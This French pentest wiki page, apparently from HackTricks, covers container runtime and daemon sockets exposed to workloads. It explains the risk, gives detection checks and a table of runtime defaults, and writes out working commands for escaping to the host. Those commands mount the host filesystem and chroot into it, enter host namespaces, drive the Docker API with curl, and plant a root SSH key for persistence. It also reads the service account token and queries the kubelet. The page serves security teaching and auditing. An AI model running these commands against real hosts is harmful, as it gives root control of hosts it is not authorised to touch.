# Exposition de l’API d’exécution et du daemon

{{#include ../../../banners/hacktricks-training.md}}

## Vue d’ensemble

De nombreuses compromissions réelles de conteneurs ne commencent pas du tout par une évasion de namespace. Elles commencent par un accès au plan de contrôle du runtime. Si une charge de travail peut communiquer avec `dockerd`, `containerd`, CRI-O, Podman ou kubelet via un socket Unix monté ou un listener TCP exposé, l’attaquant peut être en mesure de demander la création d’un nouveau conteneur avec des privilèges supérieurs, de monter le système de fichiers de l’hôte, de rejoindre les namespaces de l’hôte ou de récupérer des informations sensibles sur le nœud. Dans ces cas, l’API du runtime constitue la véritable frontière de sécurité, et sa compromission équivaut pratiquement à compromettre l’hôte.

C’est pourquoi l’exposition des sockets du runtime doit être documentée séparément des protections du noyau. Un conteneur doté d’un seccomp ordinaire, de capabilities et d’un confinement MAC peut quand même n’être qu’à un appel d’API de compromettre l’hôte si `/var/run/docker.sock` ou `/run/containerd/containerd.sock` est monté à l’intérieur. L’isolation du conteneur en cours par le noyau peut fonctionner exactement comme prévu, alors que le plan de gestion du runtime reste entièrement exposé.

## Modèles d’accès au daemon

Docker Engine expose traditionnellement son API privilégiée via le socket Unix local `unix:///var/run/docker.sock`. Historiquement, il a également été exposé à distance via des listeners TCP tels que `tcp://0.0.0.0:2375` ou un listener protégé par TLS sur `2376`. Exposer le daemon à distance sans TLS robuste ni authentification du client revient effectivement à transformer l’API Docker en interface root distante.

containerd, CRI-O, Podman et kubelet exposent des surfaces similaires à fort impact. Les noms et les workflows diffèrent, mais pas le principe. Si l’interface permet à l’appelant de créer des charges de travail, de monter des chemins de l’hôte, de récupérer des identifiants ou de modifier des conteneurs en cours d’exécution, il s’agit d’un canal de gestion privilégié et il faut le traiter comme tel.

Une interface web de gestion des conteneurs peut exposer la même frontière sans donner au compte local un accès direct au socket. Par exemple, [le problème Portainer #493](https://github.com/portainer/portainer/issues/493) documentait la réinitialisation non authentifiée du mot de passe administrateur dans une ancienne version 1.11.1. Considérez une interface accessible localement comme une piste à examiner uniquement : vérifiez la version installée et le comportement d’authentification, le contrôle réel de l’administrateur, ainsi que la possibilité pour son endpoint géré de créer des conteneurs avec un bind mount hôte accessible en écriture. [La documentation Portainer](https://docs.portainer.io/admin/environments/add/docker/socket) indique que la gestion reposant sur un socket nécessite l’accès au socket Docker ; un endpoint rootless ou restreint modifie l’impact sur l’hôte. Ne déduisez pas l’existence d’une faille d’authentification ou d’un accès root à l’hôte à partir du seul nom d’un processus, d’un port ou d’une chaîne de version.

Voici quelques chemins locaux courants à vérifier :

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Les stacks plus anciennes ou plus spécialisées peuvent également exposer des endpoints tels que `dockershim.sock`, `frakti.sock` ou `rktlet.sock`. Ils sont moins courants dans les environnements modernes, mais s’ils sont présents, il faut les traiter avec la même prudence, car ils constituent des surfaces de contrôle du runtime plutôt que de simples sockets d’application.

## Accès distant sécurisé

Si un daemon doit être exposé au-delà du socket local, la connexion doit être protégée par TLS et, de préférence, par une authentification mutuelle afin que le daemon vérifie le client et que le client vérifie le daemon. L’ancienne habitude d’exposer le daemon Docker en HTTP non chiffré par commodité est l’une des erreurs les plus dangereuses dans l’administration des conteneurs, car la surface d’API permet de créer directement des conteneurs privilégiés.

L’ancienne configuration Docker se présentait ainsi :

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Sur les hôtes basés sur systemd, la communication avec le daemon peut aussi apparaître sous la forme `fd://` : le processus hérite alors d’un socket préouvert par systemd au lieu de le lier directement lui-même. L’essentiel n’est pas la syntaxe exacte, mais la conséquence sur la sécurité. Dès que le daemon écoute au-delà d’un socket local soumis à des permissions strictes, la sécurité du transport et l’authentification des clients deviennent indispensables, et ne relèvent plus d’un renforcement facultatif.

## Exploitation

Si un socket de runtime est présent, confirmez de quel socket il s’agit, s’il existe un client compatible et si un accès HTTP brut ou gRPC est possible :

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Ces commandes sont utiles, car elles permettent de distinguer un chemin inexistant, un socket monté mais inaccessible et une API privilégiée active. Si le client fonctionne, la question suivante est de savoir si l’API peut lancer un nouveau conteneur avec un bind mount de l’hôte ou le partage d’un namespace de l’hôte.

### Lorsqu’aucun client n’est installé

L’absence de `docker`, `podman` ou d’une autre CLI conviviale ne signifie pas que le socket est sûr. Docker Engine communique en HTTP via son socket Unix, et Podman expose à la fois une API compatible avec Docker et une API native Libpod via `podman system service`. Un environnement minimal avec seulement `curl` peut donc suffire à piloter le daemon :

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Cela compte pendant la post-exploitation, car les défenseurs suppriment parfois les binaires clients habituels, mais laissent le socket de gestion monté. Sur les hôtes Podman, gardez à l’esprit que le chemin de grande valeur diffère selon que le déploiement est rootful ou rootless : `unix:///run/podman/podman.sock` pour les instances de service rootful et `unix://$XDG_RUNTIME_DIR/podman/podman.sock` pour les instances rootless.

### Exemple complet : du socket Docker à root sur l’hôte

Si `docker.sock` est accessible, la méthode classique d’évasion consiste à démarrer un nouveau conteneur qui monte le système de fichiers racine de l’hôte, puis à y exécuter `chroot` :

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Cela permet d’exécuter directement des commandes en tant que root sur l’hôte via le daemon Docker. L’impact ne se limite pas à la lecture de fichiers. Une fois dans le nouveau conteneur, l’attaquant peut modifier des fichiers de l’hôte, récupérer des identifiants, implanter une persistance ou lancer d’autres workloads privilégiés.

### Exemple complet : du socket Docker aux namespaces de l’hôte

Si l’attaquant préfère entrer dans les namespaces plutôt que de se limiter à l’accès au système de fichiers :

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Ce chemin atteint l’hôte en demandant au runtime de créer un nouveau container avec une exposition explicite des namespaces de l’hôte, plutôt qu’en exploitant le container actuel.

### Docker Socket Persistence Pattern

Le contrôle du runtime peut aussi servir à assurer la persistance, plutôt qu’à obtenir un shell ponctuel. Le schéma générique consiste à créer un container auxiliaire avec un montage sur l’hôte, à écrire des éléments d’accès autorisés ou un hook de démarrage dans le système de fichiers de l’hôte monté, puis à vérifier que l’hôte les utilise.

Exemple de forme :

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

La même idée peut cibler des unités systemd, des fragments cron, des fichiers de démarrage d’applications ou des clés SSH, selon ce que l’opérateur veut démontrer. Le point important est que la modification persistante s’effectue grâce aux droits du daemon d’exécution sur le système de fichiers de l’hôte, et non grâce à des privilèges supplémentaires dans le conteneur d’origine.

### Raw Docker API Helper Pivot

Lorsque la CLI Docker est absente, le même flux d’utilisation d’un helper avec montage de l’hôte peut être exécuté via HTTP sur le socket Unix. Le flux générique consiste à vérifier l’API, créer un conteneur helper avec un montage lié à l’hôte, le démarrer, créer une instance exec, puis démarrer cet exec.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

La requête finale `/exec/<id>/start` dépend de l’ID exec renvoyé, mais le point de sécurité ne dépend pas des détails exacts du JSON : un accès direct à l’API d’un daemon Docker rootful suffit pour demander une charge de travail auxiliaire plus puissante.

### Exemple complet : socket containerd

Un socket `containerd` monté est généralement tout aussi dangereux :<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Si un client plus proche de Docker est disponible, `nerdctl` peut être plus pratique que `ctr`, car il expose des options familières telles que `--privileged`, `--pid=host` et `-v` :

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

L’impact est à nouveau une compromission de l’hôte. Même si les outils spécifiques à Docker sont absents, une autre API de runtime peut toujours offrir les mêmes privilèges administratifs. Sur les nœuds Kubernetes, `crictl` peut également suffire pour la reconnaissance et l’interaction avec les conteneurs, car il communique directement avec le point de terminaison CRI.

### BuildKit Socket

`buildkitd` passe facilement inaperçu, car on le considère souvent comme « simplement le backend de build », mais le daemon reste un plan de contrôle privilégié. Un `buildkitd.sock` accessible peut permettre à un attaquant d’exécuter des étapes de build arbitraires, d’inspecter les capacités des workers, d’utiliser les contextes locaux de l’environnement compromis et de demander des entitlements dangereux tels que `network.host` ou `security.insecure`, si le daemon a été configuré pour les autoriser.

Voici quelques premières interactions utiles :

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Si le daemon accepte des requêtes de build, testez si des entitlements non sécurisés sont disponibles :

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

L’impact exact dépend de la configuration du daemon, mais un service BuildKit rootful avec des entitlements permissifs n’est pas une simple commodité sans risque pour les développeurs. Considérez-le comme une autre surface administrative de grande valeur, en particulier sur les runners CI et les nœuds de build partagés.

### API Kubelet sur TCP

Le kubelet n’est pas un runtime de conteneurs, mais il fait toujours partie du plan de gestion des nœuds et relève souvent du même périmètre de confiance. Si le port sécurisé du kubelet `10250` est accessible depuis la charge de travail, ou si des identifiants de nœud, des kubeconfigs ou des droits de proxy sont exposés, l’attaquant peut être en mesure de recenser les Pods, de récupérer des journaux ou d’exécuter des commandes dans des conteneurs locaux au nœud, sans jamais passer par le chemin d’admission du serveur d’API Kubernetes.

Commencez par une découverte rapide :

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Si le kubelet ou le chemin proxy de l’API server autorise `exec`, un client compatible avec WebSocket peut ainsi exécuter du code dans d’autres conteneurs du nœud. C’est aussi pourquoi `nodes/proxy` avec la seule permission `get` est plus dangereux qu’il n’y paraît : la requête peut tout de même atteindre des endpoints du kubelet qui exécutent des commandes, et ces interactions directes avec le kubelet n’apparaissent pas dans les journaux d’audit Kubernetes habituels.<sup>[[2]](#references)</sup>

## Vérifications

L’objectif de ces vérifications est de déterminer si le conteneur peut accéder à un plan de gestion qui aurait dû rester en dehors de la frontière de confiance.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Ce qui est intéressant ici :

- Un socket runtime monté constitue généralement un accès administratif direct, et non une simple divulgation d’informations.
- Un listener TCP sur `2375` sans TLS doit être considéré comme une condition permettant une compromission à distance.
- Les variables d’environnement telles que `DOCKER_HOST` révèlent souvent que la charge de travail a été conçue intentionnellement pour communiquer avec le runtime de l’hôte.

## Valeurs par défaut des runtimes

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissement manuel courant |
| --- | --- | --- | --- |
| Docker Engine | Socket Unix local par défaut | `dockerd` écoute sur le socket local et le daemon s’exécute généralement avec les privilèges root | montage de `/var/run/docker.sock`, exposition de `tcp://...:2375`, TLS faible ou absent sur `2376` |
| Podman | CLI sans daemon par défaut | Aucun daemon privilégié persistant n’est nécessaire pour une utilisation locale ordinaire ; des sockets API peuvent toutefois être exposés lorsque `podman system service` est activé | exposition de `podman.sock`, exécution du service avec une large portée, utilisation de l’API avec les privilèges root |
| containerd | Socket local privilégié | API administrative exposée via le socket local et généralement utilisée par des outils de niveau supérieur | montage de `containerd.sock`, accès étendu à `ctr` ou `nerdctl`, exposition d’espaces de noms privilégiés |
| CRI-O | Socket local privilégié | Le point de terminaison CRI est destiné aux composants de confiance locaux au nœud | montage de `crio.sock`, exposition du point de terminaison CRI à des charges de travail non fiables |
| Kubelet Kubernetes | API de gestion locale au nœud | Le kubelet ne devrait pas être largement accessible depuis les Pods ; selon l’authentification et l’autorisation, l’accès peut exposer l’état des Pods, des identifiants et des fonctionnalités d’exécution | montage de sockets ou de certificats kubelet, authentification kubelet faible, réseau de l’hôte avec point de terminaison kubelet accessible |

## References

- [1] [Exploitation du socket containerd, partie 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Risques de contournement de l’API Server Kubernetes](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
